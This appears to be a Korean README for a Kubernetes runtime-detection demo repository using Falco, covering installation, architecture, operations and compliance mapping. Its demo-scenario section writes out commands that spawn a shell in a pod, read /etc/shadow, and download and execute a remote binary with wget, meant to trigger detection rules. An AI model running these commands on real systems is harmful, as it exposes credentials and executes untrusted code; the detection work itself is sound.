# K8s Runtime Detection — 클러스터 런타임 위협 탐지 프레임워크

컨테이너가 **실행 중일 때(runtime)** 발생하는 보안 이벤트를 수집·탐지·알림·차단까지 이어지는 **엔드투엔드 데모/레퍼런스** 저장소입니다.
리포는 규칙(`rules/`), 데모 매니페스트(`manifests/demo/`), 인프라(`infra/`), 스크립트(`scripts/`), 문서(`docs/`), 자동화(예: `Makefile`)로 구성되어 있습니다.

---

## 목적 · 문제 정의 · 핵심 기능

**목적**

* 배포 이후(런타임 단계)에 발생하는 **권한 상승**, **파일/프로세스 이상 행위**, **네트워크 우회** 등을 **실시간 탐지**하고, 필요 시 **차단(예: 정책/격리)** 합니다. 런타임 보안은 배포 전 스캔이나 어드미션 정책만으로는 포착되지 않는 행위를 보완합니다. ([sysdig.com][2])

**문제 정의**

* 이미지 스캔/Admission Controller가 통과하더라도, 실행 중엔 **eBPF 이벤트** 수준의 행위 기반 공격(쉘 스폰, 민감 파일 접근, 원격 다운로드·실행)이 발생할 수 있습니다. 이를 **호스트/커널 이벤트**와 **컨테이너 메타데이터**를 연결해 탐지해야 합니다. ([GitHub][3])

**핵심 기능(이 저장소 관점)**

* `rules/` : 런타임 탐지 규칙(예: Falco 스타일 룰셋) 샘플과 커스터마이징 가이드
* `manifests/demo/` : 의도적으로 이벤트를 발생시키는 데모 워크로드
* `infra/` : 로컬(kind)·EKS 배포 스크립트/템플릿
* `scripts/` : 설치/수집/테스트 자동화 스크립트
* `docs/` : 아키텍처/데모 절차/운영 가이드

> 규칙 엔진은 **Falco(기본 가정)** 를 예시로 설명합니다. Tracee 등 eBPF 기반 엔진을 쓰고자 할 경우 Helm 차트와 룰 포맷만 해당 엔진으로 바꿔 적용하세요. ([GitHub][3])

---

## 빠른 시작(Quick Start)

> **사전 요구**: `kubectl`, `helm`, `docker`, `kind`(로컬 체험) 또는 **EKS** 컨텍스트, `make`(선택)

### 1) 로컬(kind) 실습

```bash
# kind 클러스터 생성
kind create cluster --name k8srd

# Falco 설치(Helm)
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm upgrade --install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --set falco.jsonOutput=true \
  --set falco.jsonIncludeOutputProperty=true

# 규칙/데모 배포
kubectl apply -f rules/        # 규칙 커스텀 리소스가 있다면 적용
kubectl apply -f manifests/demo/

# 이벤트 보기
kubectl -n falco logs deploy/falco -f
```

### 2) Amazon EKS 배포(선택)

```bash
# EKS kubeconfig 세팅
aws eks update-kubeconfig --name <EKS_CLUSTER> --region <ap-northeast-2>

# Falco(or 선택 엔진) 설치
helm upgrade --install falco falcosecurity/falco \
  --namespace falco --create-namespace

# 동일한 규칙/데모 적용
kubectl apply -f rules/
kubectl apply -f manifests/demo/
```

### 3) 예상 시나리오

* 데모 파드에서 `sh`/`bash` 스폰, `/etc/passwd` 읽기, 외부 바이너리 `curl|wget` 다운로드·실행 등 → 룰 적중 → Falco가 **경보(Event)** 발생 → 로그/알림 경로로 전달(CloudWatch, Loki+Grafana 등으로 연계 가능). ([GitHub][3])

---

## 설정 · 구성

* **룰 편집**: `rules/` 의 샘플에서 조직 환경에 맞게 **네임스페이스/레이블/이미지** 조건, **파일/프로세스/네트워크** 기준을 조정하세요.
* **출력 경로**: 기본은 파드 로그. 운영에서는 **Falcosidekick** 등으로 **SNS/Slack/Webhook/CloudWatch** 연계를 권장합니다.
* **민감 경로/프로세스 화이트리스트**: 베이스 이미지/오퍼레이터가 수행하는 정상 동작을 화이트리스트에 등록해 **오탐을 줄이고 규칙을 구체화**합니다.
* **리소스 한도**: 에이전트 DaemonSet의 **CPU/메모리** 리밋을 환경에 맞춰 조정하세요(노이즈가 많을수록 리소스 요구 증가).

---

## 아키텍처 개요

**구성 요소**

1. **eBPF 커널 센서/드라이버**: 파일·프로세스·네트워크 이벤트를 캡처(노드 단위 DaemonSet).
2. **룰 엔진**: 이벤트를 룰과 대조하여 **가중치/우선순위**로 탐지.
3. **출력/연계**: 로그, 웹훅, 메시징 시스템으로 전달(옵션: 자동 격리/차단 훅).
4. **데모 워크로드**: 정상/비정상 행위를 유발해 규칙 검증.

**데이터 흐름**
`Node eBPF → Falco/엔진 → Rule Match → Sink(Log/Alert/Webhook) → (선택) 자동 대응(Quarantine/NetworkPolicy)` ([GitHub][3])

---

## 운영 방법

**로그**

```bash
# Falco 파드 로그
kubectl -n falco logs deploy/falco -f

# 데모 네임스페이스 이벤트
kubectl get events -A | grep -i falco
```

**헬스 체크**

```bash
kubectl -n falco get pods
kubectl -n falco describe deploy/falco
```

**모니터링**

* CloudWatch Logs/ELK/ClickHouse+Loki 등으로 중앙집중화.
* 알림 채널: SNS, Slack, Teams, Opsgenie 등.

**자주 나는 장애 · 복구 절차**

* **증상**: 이벤트가 전혀 없음 → **조치**: 커널 드라이버/모듈 로드 실패 여부 확인, 노드 커널 버전 호환성 점검.
* **증상**: 오탐 과다 → **조치**: 조직 표준 동작을 화이트리스트에 추가, 룰 조건에 네임스페이스/레이블 스코프 적용.
* **증상**: Falco CrashLoop → **조치**: 리소스 리밋 상향, 버전/차트 고정, noisy 규칙 비활성화.

---

## 보안 · 컴플라이언스

* **비밀 관리**: 토큰/웹훅 URL/자격증명은 Git에 커밋 금지. Kubernetes Secret 또는 AWS Secrets Manager 사용.
* **최소 권한(IAM)**: 로그/알림 연계 시 필요한 권한만 부여.
* **데이터 보존**: 런타임 로그는 **감사 기록**으로 분류하여 조직 정책(예: 90~180일) 관제 스토리지에 보존.
* **표준 맵핑(예시)**:

  * 탐지/모니터링: *NIST CSF DE.CM*
  * 접근/권한 최소화: *NIST CSF PR.AC*, *ISO/IEC 27001 A.5.15*
  * 로그/증적: *ISO/IEC 27001 A.8*, *(규제 시)* *GDPR Art.32*

---

## 테스트 · 데모 시나리오

```bash
# 1) 셸 스폰
kubectl exec -it -n demo deploy/vuln -- sh

# 2) 민감 파일 접근
cat /etc/shadow || true

# 3) 외부 바이너리 다운로드/실행
wget http://example.com/x && chmod +x ./x && ./x || true
```

> 위 동작은 **테스트 네임스페이스에서만** 수행하세요. 프로덕션에서는 금지입니다.

---

## CI/CD 연동(선택)

* PR 시 **룰 정적 검사**(스키마/필수 필드, 금지 패턴) 및 **샘플 트레이스 재생 테스트**(pcap/trace 리플레이)로 회귀 방지.
* 실패 시 Merge 차단, 승인 후 배포 파이프라인에서 Helm 릴리스/매니페스트 적용.

---

## 디렉터리 구조(요약)

* `rules/` — 룰셋 및 샘플(운영 전 화이트리스트/스코프 조정)
* `manifests/demo/` — 데모/검증용 매니페스트
* `infra/` — kind/EKS 배포 스크립트·템플릿
* `scripts/` — 설치/수집/도구 실행 스크립트
* `docs/` — 개요/데모 가이드
* `Makefile` — 빈번 작업을 래핑한 명령(있을 경우) ([GitHub][1])

---

## 기여 가이드

* 브랜치: `main` 보호, 기능은 `feat/*`, 수정은 `fix/*` 브랜치에서 PR
* 커밋: Conventional Commits(`feat:`, `fix:`, `docs:` …)
* PR 내용: 변경 이유, 영향 범위, 테스트 방법, 롤백 전략
* 테스트: 데모 시나리오/룰 단위 테스트(가능 시 gVisor/Trace replay)

---

## 라이선스 / 변경 이력

* 라이선스 파일을 리포에 추가하고 이 섹션에 명시하세요(예: Apache-2.0).
* `CHANGELOG.md` 또는 GitHub Releases를 사용해 버전별 변경 이력을 관리하세요.

---

## 실무 팁(SRE/보안 관점)

* **비밀값은 README에 적지 말고** 예시는 `values.example.yaml`/샘플 Secret 템플릿으로 제공
* **환경별 차이 분리**: dev/stage/prod에서 룰 강도·화이트리스트를 분리 관리
* **장애 시 1줄 복구**: “Falco 로그 확인 → noisy 룰 일시 비활성화 → 리소스 상향/업그레이드 → 원인 분석 후 룰 정제”
* **자동화 명령 통일**: `make bootstrap`, `make deploy`, `make demo`, `make cleanup` 같은 래퍼 제공

---

## 부록: 유용한 커맨드

```bash
# 설치/배포(예시)
helm upgrade --install falco falcosecurity/falco -n falco --create-namespace

# 규칙/데모 적용
kubectl apply -f rules/
kubectl apply -f manifests/demo/

# 상태/로그
kubectl -n falco get pods
kubectl -n falco logs deploy/falco -f

# 정리
kubectl delete -f manifests/demo/
kubectl delete -f rules/
helm -n falco uninstall falco && kubectl delete ns falco
```

---

